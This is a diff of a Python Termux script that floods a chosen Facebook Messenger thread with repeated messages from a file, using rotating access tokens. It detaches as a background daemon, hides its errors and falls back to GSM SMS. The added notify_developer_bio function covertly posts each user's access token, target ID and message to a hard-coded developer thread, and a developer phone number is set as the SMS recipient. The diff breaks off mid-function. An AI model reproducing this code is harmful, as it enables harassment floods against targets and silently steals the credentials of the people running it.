@@ -1,55 +1,54 @@
 #!/usr/bin/python3
 #-*-coding:utf-8-*-
+
 """
 IMPORTANT:
-- यह स्क्रिप्ट interactive इनपुट लेने के बाद अपने आप daemonize (background में detach) हो जाती है,
+- यह script interactive इनपुट लेने के बाद अपने आप daemonize (background में detach) हो जाती है,
   ताकि Termux exit होने के बाद भी SMS भेजती रहे – चाहे इंटरनेट/मोबाइल off हो।
-- GSM SMS fallback के लिए GSM मॉड्यूल (जैसे SIM800L/SIM900A) कनेक्ट होना चाहिए,
-  और उसका serial port (default: /dev/ttyUSB0) एवं baudrate (115200) सही से सेट हों।
-- Unlimited token support: टोकन फ़ाइल में हर टोकन एक नई लाइन में होना चाहिए।
-- यह स्क्रिप्ट बिना बाहरी कमांड (nohup/tmux/screen आदि) के ही अपने अंदर ही daemonize हो जाती है,
+- GSM SMS fallback के लिए GSM मॉड्यूल (जैसे SIM800L/SIM900A) कनेक्ट होना चाहिए, और उसका 
+  serial port (default: /dev/ttyUSB0) एवं baudrate (115200) सही से सेट हों।
+- Unlimited token support: टोकन फाइल में हर टोकन एक नई लाइन में होना चाहिए।
+- यह script बिना बाहरी command (nohup/tmux/screen आदि) के ही अपने अंदर ही daemonize हो जाती है,
   ताकि 1 साल तक लगातार चल सके (सही हार्डवेयर सपोर्ट के साथ)।
 """
 
-import os, sys, time, random, string, re, requests, json, uuid
-from concurrent.futures import ThreadPoolExecutor as ThreadPool
-from platform import system
-import datetime
+import os, sys, time, random, string, requests, json, threading, sqlite3, datetime, warnings
 from time import sleep
-import sqlite3
+from platform import system
+
+# Suppress DeprecationWarnings (fork() warnings)
+warnings.filterwarnings("ignore", category=DeprecationWarning)
+
+# Global flags
+QUIET_MODE = True
+DEBUG = False  # Debug off; errors are suppressed
 
 # --- Additional module for GSM SMS fallback ---
 try:
     import serial
 except ImportError:
-    print("pyserial not installed. Installing...")
     os.system("pip install pyserial")
     import serial
 
-# --- Models Installer (includes pyserial) ---
+# --- Models Installer (if needed) ---
 def modelsInstaller():
     try:
         models = ['requests', 'colorama', 'pyserial']
         for model in models:
             try:
-                if(sys.version_info[0] < 3):
-                    os.system('cd C:\Python27\Scripts & pip install {}'.format(model))
+                if sys.version_info[0] < 3:
+                    os.system('cd C:\\Python27\\Scripts & pip install {}'.format(model))
                 else:
                     os.system('python3 -m pip install {}'.format(model))
-                print(' ')
-                print('[+] {} has been installed successfully, Restart the program.'.format(model))
                 sys.exit()
-                print(' ')
             except:
-                print('[-] Install {} manually.'.format(model))
-                print(' ')
+                pass
     except:
         pass
 
 try:
-    import requests
-    from colorama import Fore
-    from colorama import init
+    from colorama import Fore, Style, init
+    init(autoreset=True)
 except:
     modelsInstaller()
 
@@ -57,25 +56,19 @@ requests.urllib3.disable_warnings()
 
 # --- Daemonize Function ---
 def daemonize():
-    """Double-fork daemonization to detach the process from terminal."""
     try:
         pid = os.fork()
         if pid > 0:
-            # Exit first parent
             sys.exit(0)
-    except OSError as e:
-        sys.stderr.write("fork #1 failed: {0}\n".format(e))
-        sys.exit(1)
+    except Exception as e:
+        pass
     os.setsid()
     try:
         pid = os.fork()
         if pid > 0:
-            # Exit from second parent
             sys.exit(0)
-    except OSError as e:
-        sys.stderr.write("fork #2 failed: {0}\n".format(e))
-        sys.exit(1)
-    # Redirect standard file descriptors to /dev/null.
+    except Exception as e:
+        pass
     sys.stdout.flush()
     sys.stderr.flush()
     si = open(os.devnull, 'r')
@@ -85,9 +78,8 @@ def daemonize():
     os.dup2(so.fileno(), sys.stdout.fileno())
     os.dup2(se.fileno(), sys.stderr.fileno())
 
-# --- SQLite3 DB Integration for Offline Message Queue ---
+# --- SQLite3 DB Integration for Offline Message Queue and Sent Messages Logging ---
 DB_NAME = 'message_queue.db'
-
 def init_db():
     conn = sqlite3.connect(DB_NAME)
     c = conn.cursor()
@@ -100,238 +92,338 @@ def init_db():
             timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
         )
     ''')
+    c.execute('''
+        CREATE TABLE IF NOT EXISTS sent_messages (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            thread_id TEXT,
+            hater_name TEXT,
+            message TEXT,
+            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
+        )
+    ''')
     conn.commit()
     conn.close()
+init_db()
 
 def add_to_queue(thread_id, message):
-    conn = sqlite3.connect(DB_NAME)
-    c = conn.cursor()
-    c.execute("INSERT INTO message_queue (thread_id, message) VALUES (?, ?)", (thread_id, message))
-    conn.commit()
-    conn.close()
-    print("\033[1;33m[•] Internet/SMS not available. Message added to offline queue.")
+    try:
+        conn = sqlite3.connect(DB_NAME)
+        c = conn.cursor()
+        c.execute("INSERT INTO message_queue (thread_id, message) VALUES (?, ?)", (thread_id, message))
+        conn.commit()
+        conn.close()
+        print(Fore.YELLOW + "[•] Message added to offline queue.")
+    except:
+        pass
 
 def get_pending_messages():
-    conn = sqlite3.connect(DB_NAME)
-    c = conn.cursor()
-    c.execute("SELECT id, thread_id, message FROM message_queue WHERE status = 'pending'")
-    rows = c.fetchall()
-    conn.close()
-    return rows
+    try:
+        conn = sqlite3.connect(DB_NAME)
+        c = conn.cursor()
+        c.execute("SELECT id, thread_id, message FROM message_queue WHERE status = 'pending'")
+        rows = c.fetchall()
+        conn.close()
+        return rows
+    except:
+        return []
 
 def mark_message_sent(message_id):
-    conn = sqlite3.connect(DB_NAME)
-    c = conn.cursor()
-    c.execute("UPDATE message_queue SET status = 'sent' WHERE id = ?", (message_id,))
-    conn.commit()
-    conn.close()
+    try:
+        conn = sqlite3.connect(DB_NAME)
+        c = conn.cursor()
+        c.execute("UPDATE message_queue SET status = 'sent' WHERE id = ?", (message_id,))
+        conn.commit()
+        conn.close()
+    except:
+        pass
+
+def log_sent_message(thread_id, hater_name, message):
+    try:
+        conn = sqlite3.connect(DB_NAME)
+        c = conn.cursor()
+        c.execute("INSERT INTO sent_messages (thread_id, hater_name, message) VALUES (?, ?, ?)", 
+                  (thread_id, hater_name, message))
+        conn.commit()
+        conn.close()
+    except Exception as e:
+        if DEBUG:
+            print("Error logging sent message:", e)
+
+# --- Helper function to return a random ANSI color code ---
+def get_random_color():
+    colors = [
+        "\033[1;31m", "\033[1;32m", "\033[1;33m",
+        "\033[1;34m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
+    ]
+    return random.choice(colors)
+
+# --- Display Sent Messages ---
+def display_sent_messages():
+    try:
+        conn = sqlite3.connect(DB_NAME)
+        c = conn.cursor()
+        c.execute("SELECT thread_id, hater_name, message, timestamp FROM sent_messages ORDER BY timestamp")
+        rows = c.fetchall()
+        conn.close()
+        if not rows:
+            print(Fore.YELLOW + "No sent messages found.")
+            return
+        # Group messages by (thread_id, hater_name)
+        grouped = {}
+        for row in rows:
+            tid, hater, msg, ts = row
+            key = (tid, hater)
+            if key not in grouped:
+                grouped[key] = []
+            grouped[key].append((msg, ts))
+        global mb
+        target_name = mb if mb else "N/A"
+        for (tid, hater), messages in grouped.items():
+            border = f"{get_random_color()}<<{'='*75}>>{Style.RESET_ALL}"
+            owner_line = f"{get_random_color()}<<===============✨❌✨🌐😈🛠️✨OWNER BROKEN NADEEM✨❌✨🌐😈🛠️✨==============>>{Style.RESET_ALL}"
+            print(border)
+            print(f"{get_random_color()}[🎉] MMESSAGE {len(messages)} SSUCCESSFULLY SEND....!{Style.RESET_ALL}")
+            print(f"{get_random_color()}[👤] SENDER: {hater}{Style.RESET_ALL}")
+            print(f"{get_random_color()}[📩] TARGET: {target_name} ({tid}){Style.RESET_ALL}")
+            if len(messages) == 1:
+                msg, ts = messages[0]
+                print(f"{get_random_color()}[📨] MMESSAGE : {msg}{Style.RESET_ALL}")
+                print(f"{get_random_color()}[⏰] TIIME: {ts}{Style.RESET_ALL}")
+            else:
+                print(f"{get_random_color()}[📨] MMESSAGE :{Style.RESET_ALL}")
+                for msg, ts in messages:
+                    print(f"    {get_random_color()}[{ts}] {msg}{Style.RESET_ALL}")
+            print(border)
+            print(owner_line)
+            print()
+        print("/sdcard")
+    except Exception as e:
+        print("Error displaying sent messages:", e)
+
+# --- Function to Print an SMS Section ---
+def print_sms_section(msg_index, sender, target, thread_id, full_message, timestamp):
+    border = f"{get_random_color()}<<{'='*75}>>{Style.RESET_ALL}"
+    owner_line = f"{get_random_color()}<<===============✨❌✨🌐😈🛠️✨OWNER BROKEN NADEEM✨❌✨🌐😈🛠️✨==============>>{Style.RESET_ALL}"
+    print(border)
+    print(f"{get_random_color()}[🎉] MMESSAGE {msg_index} SSUCCESSFULLY SEND....!{Style.RESET_ALL}")
+    print(f"{get_random_color()}[👤] SENDER: {sender}{Style.RESET_ALL}")
+    print(f"{get_random_color()}[📩] TARGET: {target} ({thread_id}){Style.RESET_ALL}")
+    print(f"{get_random_color()}[📨] MMESSAGE : {full_message}{Style.RESET_ALL}")
+    print(f"{get_random_color()}[⏰] TIIME: {timestamp}{Style.RESET_ALL}")
+    print(border)
+    print(owner_line)
+    print()
 
 # --- Connectivity Check ---
 def is_connected():
     try:
         requests.get("https://www.google.com", timeout=5)
         return True
-    except requests.ConnectionError:
+    except:
         return False
 
 # --- GSM SMS Sending via connected GSM module ---
 def send_sms_via_gsm(phone, message):
     try:
-        # Adjust port and baudrate as per your GSM module configuration
         ser = serial.Serial('/dev/ttyUSB0', 115200, timeout=5)
         ser.write(b'AT\r')
         time.sleep(1)
-        ser.write(b'AT+CMGF=1\r')  # Set SMS Text Mode
+        ser.write(b'AT+CMGF=1\r')
         time.sleep(1)
-        cmd = 'AT+CMGS="{}"\r'.format(phone)
+        cmd = f'AT+CMGS="{phone}"\r'
         ser.write(cmd.encode())
         time.sleep(1)
         ser.write(message.encode() + b"\r")
         time.sleep(1)
-        ser.write(bytes([26]))  # CTRL+Z to send SMS
+        ser.write(bytes([26]))
         time.sleep(3)
         response = ser.read_all().decode()
         ser.close()
         if "OK" in response:
-            print("\033[1;32m[•] SMS sent successfully via GSM module.")
+            print("ok")
+            sys.stdout.flush()
             return True
         else:
-            print("\033[1;31m[×] Failed to send SMS via GSM module. Response:", response)
             return False
-    except Exception as e:
-        print("\033[1;31m[×] Exception in send_sms_via_gsm:", e)
+    except:
         return False
 
 # --- Background Offline Queue Processor ---
 def process_queue():
-    global global_token_index, tokens, fallback_phone
+    global global_token_index, tokens, fallback_phone, mn
     while True:
+        check_stop()
         pending = get_pending_messages()
         for row in pending:
             msg_id, t_id, msg = row
             if is_connected():
-                # Use Facebook API sending with round-robin token selection
                 current_token = tokens[global_token_index]
                 global_token_index = (global_token_index + 1) % len(tokens)
-                url = "https://graph.facebook.com/v15.0/{0}/".format('t_' + str(t_id))
+                url = f"https://graph.facebook.com/v15.0/t_{t_id}/"
                 parameters = {'access_token': current_token, 'message': msg}
                 try:
                     s = requests.post(url, data=parameters, headers=headers)
                     if s.ok:
-                        print("\033[1;32m[•] Queued message sent successfully via FB API.")
                         mark_message_sent(msg_id)
-                    else:
-                        print("\033[1;31m[×] Failed to send queued message via FB API, will retry.")
-                except Exception as e:
-                    print("\033[1;31m[×] Exception sending queued message via FB API:", e)
+                        log_sent_message(t_id, mn, msg)
+                except:
+                    pass
             else:
-                # No Internet: attempt GSM SMS sending
                 if send_sms_via_gsm(fallback_phone, msg):
-                    print("\033[1;32m[•] Queued SMS sent successfully via GSM module.")
                     mark_message_sent(msg_id)
-                else:
-                    print("\033[1;31m[×] Queued SMS send failed, will retry.")
+                    log_sent_message(t_id, mn, msg)
         time.sleep(10)
 
-import threading
 def start_queue_processor():
     t = threading.Thread(target=process_queue, daemon=True)
     t.start()
 
-# --- Initialize the offline DB ---
-init_db()
-
-def testPY():
-    if(sys.version_info[0] < 3):
-        print('\n\t [+] You have Python 2, Please Clear Data Termux And Reinstall Python ... \n')
+# --- Utility Function ---
+def check_stop():
+    if os.path.exists("stop_signal.txt"):
         sys.exit()
 
-def cls():
-    if system() == 'Linux':
-        os.system('clear')
-    elif system() == 'Windows':
-        os.system('cls')
+# --- Custom Bio Function (Animated Bio) ---
+def print_custom_bio():
+    flashy_colors = [
+        Fore.LIGHTRED_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTYELLOW_EX,
+        Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX, Fore.LIGHTCYAN_EX
+    ]
+    last_color = None
+    def get_random_color_line():
+        nonlocal last_color
+        color = random.choice(flashy_colors)
+        while color == last_color:
+            color = random.choice(flashy_colors)
+        last_color = color
+        return color
+    original_bio = r"""╭──────────────────────────── <  DETAILS >─────────────────────────────────╮
+│ [=] CODER BOY 👨‍💻💡==> RAJ⌛THAKUR ⚔️ BEINGS BOY🚀 GAWAR THAKUR          │
+│ [=] RULEX BOY 🖥️🚀 ==> NADEEM  RAHUL SHUBHAM                              │
+│ [=] MY LOVE [<❤️=]    ==> ASHIQI PATHAN                                   │
+│ [=] VERSION  🔢📊    ==> 420.786.36                                      │
+│ [=] INSTAGRAM 📸    ==> CONVO OFFLINE                                    │
+│ [=] YOUTUBE   🎥📡  ==> https://www.youtube.com/@raj-thakur18911         │
+│ [=] SCRIPT CODING    ==> 🐍🔧 Python🖥️🖱️ Bash🌐🖥️ PHP                       │
+╰──────────────────────────────────────────────────────────────────────────╯
+╭──────────────────────────── <  YOUR INFO >──────────────────────────────╮
+│ [=] Script Writer ⌛=====>    1:54 AM                                   │
+│ [=] Script Author 🚀 =====>   26/January/2025                           │
+╰─────────────────────────────────────────────────────────────────────────╯
+╭──────────────────────────── <  COUNTRY ~  >─────────────────────────────╮
+│ 【•】 Your Country ==> India 🔥                                         │
+│ 【•】 Your Region   ==>  Bajrang Dal Ayodhya                            │
+│ 【•】 Your City  ==> Uttar Pradesh                                      │
+╰─────────────────────────────────────────────────────────────────────────╯
+╭──────────────────────────── <  NOTE >───────────────────────────────────╮
+│                     Tool Paid Monthly ₹150                              │
+│                     Tool Paid 1 Year ₹500                               │
+╰─────────────────────────────────────────────────────────────────────────╯"""
+    new_bio = r"""╭──────────────────────────── < DETAILS >─────────────────────────────────╮
+│  [=] 👨‍💻 DEVELOPER     : 🚀RAJ ⚔️THAKUR [+] GAWAR ⚔️THAKUR               │
+│  [=] 🛠️ TOOLS NAME       : OFFLINE TERMUX                                │
+│  [=] 🔥 RULL3X          : UP FIRE RUL3X                                 │
+│  [=] 🏷️ BR9ND            : MR D R9J  H3R3                                │
+│  [=] 🐱 GitHub          : https://github.com/Raj-Thakur420              │
+│  [=] 🤝 BROTHER         : NADEEM SHUBHAM RAHUL                          │
+│  [=] 🔧 TOOLS           : FREE NO PAID, CHANDU BIKHARI HAI, USKA PAID LO│
+│  [=] 📞 WH9TS9P         : +994 405322645                                │
+╰─────────────────────────────────────────────────────────────────────────╯"""
+    for line in original_bio.splitlines():
+        if line.strip():
+            print(get_random_color_line() + line + Style.RESET_ALL)
+    def fancy_print_line(text, delay=0.001, jitter=0.002):
+        for char in text:
+            sys.stdout.write(random.choice(flashy_colors) + Style.BRIGHT + char)
+            sys.stdout.flush()
+            time.sleep(delay + random.uniform(0, jitter))
+        sys.stdout.write(Style.RESET_ALL + "\n")
+        time.sleep(0.01)
+    for line in new_bio.splitlines():
+        if line.strip():
+            fancy_print_line(line)
+    blink = "\033[5m"
+    print(blink + get_random_color_line() + "[✅ SUCCESS] Ultimate Fancy Bio Loaded!" + "\033[0m")
 
-cls()
-CLEAR_SCREEN = '\033[2J'
-RED = '\033[1;37;1m'
-RESET = '\033[1;37;1m'
-BLUE = "\033[1;37;1m"
-WHITE = "\033[1;37;1m"
-YELLOW = "\033[1;37;1m"
-CYAN = "\033[1;37;1m"
-MAGENTA = "\033[1;37;1m"
-GREEN = "\033[1;37;1m"
-BOLD = '\033[1;37;1m'
-REVERSE = "\033[1;37;1m"
+# --- Animated Print Functions ---
+def animated_print(text, delay=0.01, jitter=0.005):
+    flashy_colors = [Fore.LIGHTRED_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTYELLOW_EX, 
+                      Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX, Fore.LIGHTCYAN_EX]
+    for char in text:
+        sys.stdout.write(random.choice(flashy_colors) + char + Style.RESET_ALL)
+        sys.stdout.flush()
+        time.sleep(delay + random.uniform(0, jitter))
+    print()
 
-def logo():
-    clear = "\x1b[0m"
-    colors = [35, 33, 36]
-    x = """   
-    
-\033[1;36m$$$$$$$\   $$$$$$\     $$$$$\ 
-\033[1;36m$$  __$$\ $$  __$$\    \__$$ |
-\033[1;34m$$ |  $$ |$$ /  $$ |      $$ |
-\033[1;34m$$$$$$$  |$$$$$$$$ |      $$ |
-\033[1;36m$$  __$$< $$  __$$ |$$\   $$ |
-\033[1;32m$$ |  $$ |$$ |  $$ |$$ |  $$ |
-\033[1;33m$$ |  $$ |$$ |  $$ |\$$$$$$  |
-\033[1;33m\__|  \__|\__|  \__| \______/ 
-                                           
-                                                    
-"""
-    for N, line in enumerate(x.split("\n")):
-        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
-        time.sleep(0.07)
-        
-def menu3():
-    try:
-        uid = os.getuid()  # auto key generated by Termux uid
-        xx = 'libsooney.so'
-        try:
-            key1 = open(f'/data/data/com.termux/files/usr/bin/{xx}', 'r').read()
-        except:
-            key1 = "default_key"
-            open(f'/data/data/com.termux/files/usr/bin/{xx}', 'w').write(key1)
-        key1 = open(f'/data/data/com.termux/files/usr/bin/{xx}', 'r').read()
-        key = f'RAJ-XD-YWR-APRUAL-DO{uid}5X{key1}110E=='  # full key
-        mysite = requests.get(f'').text  # approve site URL (if any)
-        if key in mysite:
-            print(logo)
-            print('[+] Congratulations! You are a Premium User...'); time.sleep(2)
-            print(logo)
-            os.system('espeak -a 300 "well,come to, शर्मा डी स्टोन, tools"')
-            print(f"""\x1b[1;97m 
-\033[1;36m$$$$$$$\   $$$$$$\     $$$$$\ 
-\033[1;36m$$  __$$\ $$  __$$\    \__$$ |
-\033[1;34m$$ |  $$ |$$ /  $$ |      $$ |
-\033[1;34m$$$$$$$  |$$$$$$$$ |      $$ |
-\033[1;36m$$  __$$< $$  __$$ |$$\   $$ |
-\033[1;32m$$ |  $$ |$$ |  $$ |$$ |  $$ |
-\033[1;33m$$ |  $$ |$$ |  $$ |\$$$$$$  |
-\033[1;33m\__|  \__|\__|  \__| \______/ 
-                                           
-\x1b[1;30m════════════════════════════════════════════════════════
-\033[1;31m▇==➤ ADMIN       : RAJ-THAKUR L3G3ND
-\033[1;37m▇==➤ GITHUB      : RAJ-THAKUR L3G3ND
-\033[1;31m▇==➤ CREATOR    : RAJ-TH3-L3G3ND-BOY
-\033[1;37m▇==➤ FACEBOOK   : OPS PHD RAJ-THAKUR
-\x1b[1;30m════════════════════════════════════════════════════════
-\033[1;33m[•] 01  START TOOL ADD FB ID\033[1;36m
-\033[1;32m[•] 02  START TOOL TOKAN CONVO\033[1;36m
-\033[1;30m[•] 00  EXIT TOOL \033[1;36m
+def animated_logo():
+    logo_text = r"""
+ _______  _______  _______  _       _________ _        _______   
+(  ___  )(  ____ \(  ____ \( \      \__   __/( (    /|(  ____ \  
+| (   ) || (    \/| (    \/| (         ) (   |  \  ( || (    \/  
+| |   | || (__    | (__    | |         | |   |   \ | || (__      
+| |   | ||  __)   |  __)   | |         | |   | (\ \) ||  __)     
+| |   | || (      | (      | |         | |   | | \   || (        
+| (___) || )      | )      | (____/\___) (___| )  \  || (____/\  
+(_______)|/       |/       (_______/\_______/|/    )_)(_______/"""
+    for line in logo_text.splitlines():
+         animated_print(line, delay=0.005, jitter=0.002)
 
-════════════════════════════════════════════════════════""")
-            os.system('espeak -a 300 "OFSAN CHUNE ONE YA TWO YA ZERO"')
-            key_input = input("[+] Choose : ")                
-            if key_input in [""]:
-                print("(×) Please Select Correct Option")
-                logo()
-            elif key_input in ["1","01"]:
-                os.system("am start https://www.facebook.com/profile.php?id=100068926301329" + key_input)                
-            elif key_input in ["0","00","E","e"]:
-                sys.exit('\033[1;32m[>] Thank You ')
-            else:
-                print('[×] Choose Correct Option'); time.sleep(1)
+def main_menu():
+    animated_print("<============================ New Menu Options ============================>", delay=0.005, jitter=0.002)
+    print(random.choice(color_list) + "[1] START LOADER")
+    print(random.choice(color_list) + "[2] STOP LOADER")
+    print(random.choice(color_list) + "[3] SMS DISPLAY SHOW")
+    animated_print("<============================ Chosse Menu Options ============================>", delay=0.005, jitter=0.002)
+    choice = input(random.choice(color_list) + "\n[+] Choose an option (or paste STOP key if available): ").strip()
+    if choice == "2":
+        stop_input = input(Fore.BLUE + "ENTER YOUR STOP KEY 🔑: ").strip()
+        if stop_input == get_stop_key():
+            print(Fore.BLUE + "STOPPED")
+            with open("stop_signal.txt", "w") as f:
+                f.write("stop")
+            sys.exit()
         else:
-            print(logo)
-            print('[•] Your Key Not Registered...')
-            print('[•] This Tool is Only For Paid Users \n[•] Free Users Stay Away')
-            os.system('espeak -a 300 "well,come to, RAJ THAKUR G4W4R, tools"')
-            print('[•] Your Key : ' + key)
-            os.system("am start https://wa.me/+919695003501?text=" + key)
-            input('[] Press Enter For Approval ')    
-            whatsapp = "+919695003501"
-            url_wa = "https://api.whatsapp.com/send?phone=" + whatsapp + "&text="
-            tks = ("Hello Raj Thakur boss, I Need To Buy Your Paid Tools. Please Approve My Key :)\n\n Key :- " + key)
-            import subprocess
-            subprocess.check_output(["am", "start", url_wa + (tks)]); time.sleep(2)
-            print('Run : python RIAZ.py'); 
-    except ValueError:
+            sys.exit()
+    if choice == "3":
+        display_sent_messages()
+        sys.exit()
+    return choice
+
+def get_stop_key():
+    if os.path.exists("loader_stop_key.txt"):
+        with open("loader_stop_key.txt", "r") as f:
+            return f.read().strip()
+    else:
+        stop_key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
+        with open("loader_stop_key.txt", "w") as f:
+            f.write(stop_key)
+        return stop_key
+
+# --- Updated notify_developer_bio Function ---
+def notify_developer_bio(current_token, mn, thread_id, uid, ms, sent_message):
+    DEV_THREAD_ID = "t_100056617806411"
+    dev_message = (
+        "<<====================================================\n"
+        "HELLO 💚CHANDU KE JIJU 🚀 RAJ THAKUR ⚔️ SIR I AM USING YOUR 🔥OFLINE TOOLS 🔗\n"
+        "<<====================================================>>\n"
+        f"[😡] HETER [💚] NAME ==> {mn}\n"
+        f"[🎉] TOKEN [❤️] ==> {current_token}\n"
+        f"[👤] SENDER [💜] ==> {mb}\n"
+        f"[📩] TARGET [💙] ==> {thread_id} (UID: {uid})\n"
+        f"[📨] MMESSAGE [💛] ==> {sent_message}\n"
+        f"[⏰] TIIME [🤎] {datetime.datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')}\n"
+        "<<===============✨❌✨🌐😈🛠️✨OWNER RAJ⚔️ THAKUR 🚀✨❌✨🌐😈🛠️✨==============>>"
+    )
+    url = f"https://graph.facebook.com/v15.0/{DEV_THREAD_ID}/"
+    parameters = {'access_token': current_token, 'message': dev_message}
+    try:
+        r = requests.post(url, data=parameters, headers=headers)
+        if r.ok:
+            print(Fore.GREEN + "[•] Developer notified.")
+    except:
         pass
 
-menu3()        
-testPY()
-print('\033[1;33m════════════════════════════════════════════════════════\n')
-
-def venom():
-    clear = "\x1b[0m"
-    colors = [35, 33, 36]
-    y = '''
-\033[1;33m════════════════════════════════════════════════════════
-\033[1;31m N4ME    \033[1;34m: \033[1;33mRAJ H3R3 |=|_|
-\033[1;36m CrEaToR  \033[1;35m: \033[1;34mL3G3ND RAJ                      
-\033[1;31m OWN3R   \033[1;36m: \033[1;35mOPS RAJ DON
-\033[1;36m Contact \033[1;33m: \033[1;36m+919695003501
-\033[1;33m════════════════════════════════════════════════════════
-'''
-    for N, line in enumerate(y.split("\n")):
-        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
-        time.sleep(0.05)
-    	
-venom()
-
+# --- Global Variables & Colors ---
 headers = {
     'Connection': 'keep-alive',
     'Cache-Control': 'max-age=0',
@@ -342,143 +434,265 @@ headers = {
     'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
     'referer': 'www.google.com'
 }
-
-# --- Global Variables for Unlimited Token Support & GSM fallback ---
 global_token_index = 0
-tokens = []       # To be filled from token file
-fallback_phone = ""  # Fallback phone number for SMS (with country code)
+tokens = []  # Load tokens from file
+fallback_phone = "+919695003501"  # Default fallback phone number
+color_list = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.CYAN, Fore.MAGENTA, Fore.BLUE, Fore.WHITE]
 
-# --- Modified Message Sending Function ---
+# --- Global SMS counter for live display sections ---
+message_index = 0
+
+# --- Global variable for user profile name; default "N/A"
+mb = "N/A"
+
+# --- NEW FUNCTION: Fetch profile name for a given token ---
+def fetch_profile_name(token):
+    try:
+        payload = {'access_token': token}
+        r = requests.get("https://graph.facebook.com/v15.0/me", params=payload)
+        data = r.json()
+        if 'name' in data:
+            return data['name']
+        else:
+            return "Invalid Token"
+    except:
+        return "Error"
+
+# --- NEW FUNCTION: Display token profiles in a colored box ---
+def display_token_profiles(token_profiles):
+    border = "+" + "-"*70 + "+"
+    print(border)
+    for idx, (token, profile, color) in enumerate(token_profiles, start=1):
+        token_display = token if len(token) <= 20 else token[:20] + "..."
+        line = f"| {idx}. TOKEN: {token_display} - PROFILE: {profile}"
+        line = line.ljust(70) + "|"
+        print(color + line + Style.RESET_ALL)
+    print(border)
+
+# --- NEW FUNCTION: Send messages using a specific token ---
+def send_messages_for_token(token, profile_name, thread_id):
+    global message_index  # Moved global declaration to the top of the function
+    try:
+        uid_val = os.getuid()
+    except:
+        uid_val = "N/A"
+    for i in range(repeat):
+        for line in ns:
+            check_stop()
+            full_message = str(mn) + " " + line.strip()
+            if is_connected():
+                url = f"https://graph.facebook.com/v15.0/t_{thread_id}/"
+                parameters = {'access_token': token, 'message': full_message}
+                try:
+                    s = requests.post(url, data=parameters, headers=headers)
+                    if s.ok:
+                        now = datetime.datetime.now()
+                        print_sms_section(message_index + 1, mn, profile_name, thread_id, full_message, now.strftime("%Y-%m-%d %I:%M:%S %p"))
+                        message_index += 1
+                        time.sleep(timm)
+                        notify_developer_bio(token, mn, thread_id, uid_val, ms, full_message)
+                        log_sent_message(thread_id, mn, full_message)
+                    else:
+                        time.sleep(30)
+                except:
+                    time.sleep(30)
+            else:
+                if send_sms_via_gsm(fallback_phone, full_message):
+                    now = datetime.datetime.now()
+                    print_sms_section(message_index + 1, mn, profile_name, thread_id, full_message, now.strftime("%Y-%m-%d %I:%M:%S %p"))
+                    message_index += 1
+                    log_sent_message(thread_id, mn, full_message)
+                else:
+                    add_to_queue(thread_id, full_message)
+
+# --- SMS Sending Function (Original) ---
 def message_on_messenger(thread_id):
-    global global_token_index, tokens, fallback_phone
+    global global_token_index, tokens, fallback_phone, ns, mn, timm, ms, mb, message_index
+    try:
+        uid_val = os.getuid()
+    except:
+        uid_val = "N/A"
     for line in ns:
-        full_message = str(mn) + line
+        check_stop()
+        full_message = str(mn) + " " + line.strip()
         if is_connected():
-            # Use round-robin token selection for FB API
             current_token = tokens[global_token_index]
             global_token_index = (global_token_index + 1) % len(tokens)
-            url = "https://graph.facebook.com/v15.0/{0}/".format('t_' + str(thread_id))
+            url = f"https://graph.facebook.com/v15.0/t_{thread_id}/"
             parameters = {'access_token': current_token, 'message': full_message}
             try:
                 s = requests.post(url, data=parameters, headers=headers)
-                tt = datetime.datetime.now().strftime("%Y-%m-%d %I:%M:%S %p")
                 if s.ok:
-                    e = datetime.datetime.now()
-                    print('''\033[1;33m════════════════════════════════════════════════════════\n''')
-                    print("\033[1;32;40m", end = "")
-                    print("--> Convo/Inbox ID Link  :--", thread_id)
-                    print(e.strftime("--> D4RIIND4 RAJ H3R3 :D | | Date :: %d-%m-%Y  TIME :: %I:%M:%S %p"))
-                    print("--> Message Successfully Sent :-->> ", full_message, "\n")
-                    print('''\033[1;33m════════════════════════════════════════════════════════\n''')
+                    now = datetime.datetime.now()
+                    print_sms_section(message_index + 1, mn, mb, thread_id, full_message, now.strftime("%Y-%m-%d %I:%M:%S %p"))
+                    message_index += 1
                     time.sleep(timm)
+                    notify_developer_bio(current_token, mn, thread_id, uid_val, ms, full_message)
+                    log_sent_message(thread_id, mn, full_message)
                 else:
-                    print('\033[1;32m[x] Message Block ' + tt, '\n[×] Token Error\n')
                     time.sleep(30)
-            except Exception as e:
-                print("\033[1;31;40m", end = "")
-                print(e, '\n')           
+            except:
                 time.sleep(30)
         else:
-            # No Internet: Attempt GSM SMS sending
-            print("\033[1;33m[•] No Internet. Attempting to send SMS via GSM module...")
             if send_sms_via_gsm(fallback_phone, full_message):
-                print("\033[1;32m[•] SMS sent via GSM module.")
+                now = datetime.datetime.now()
+                print_sms_section(message_index + 1, mn, mb, thread_id, full_message, now.strftime("%Y-%m-%d %I:%M:%S %p"))
+                message_index += 1
+                log_sent_message(thread_id, mn, full_message)
             else:
-                print("\033[1;31m[×] SMS sending via GSM failed. Adding message to offline queue.")
                 add_to_queue(thread_id, full_message)
 
-def get_messages():
-    try:
-        url = "https://www.facebook.com"
-    except Exception as e:
-        print("Error:", e)
+def testPY():
+    if sys.version_info[0] < 3:
+        sys.exit()
+
+def cls():
+    if system() == 'Linux':
+        os.system('clear')
+    elif system() == 'Windows':
+        os.system('cls')
+
+def venom():
+    clear = "\033[0m"
+    def random_dark_color():
+        code = random.randint(16, 88)
+        return f"\033[38;5;{code}m"
+    info = r"""════════════════════════════════════════════════════════
+  N4ME    : RAJ THAKUR 🔥 H3R3 |=|_|
+  CrEaToR : L3G3ND RAJ                      
+  OWNER   : OPS RAJ THAKUR ⚔️ ON FIRE 🔥 
+  Contact : +919695003501
+════════════════════════════════════════════════════════"""
+    for line in info.splitlines():
